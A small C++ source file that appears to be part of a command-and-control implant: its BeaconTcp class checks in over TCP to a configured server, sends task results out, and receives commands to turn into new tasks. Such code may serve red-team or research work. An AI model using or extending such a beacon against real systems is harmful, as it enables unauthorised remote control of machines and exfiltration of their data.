#include "BeaconTcp.hpp"

using namespace std;
using namespace SocketHandler;


BeaconTcp::BeaconTcp(std::string& ip, int port)
	: Beacon(ip, port)
{
}


BeaconTcp::~BeaconTcp()
{
}


void BeaconTcp::checkIn()
{
	Client clientsTcp(m_ip, m_port);
	
	std::string output;
	taskResultsToCmd(output);

	clientsTcp.sendData(output);

	string input;
	clientsTcp.receive(input);

	if(!input.empty())
	{
		cmdToTasks(input);
	}
}

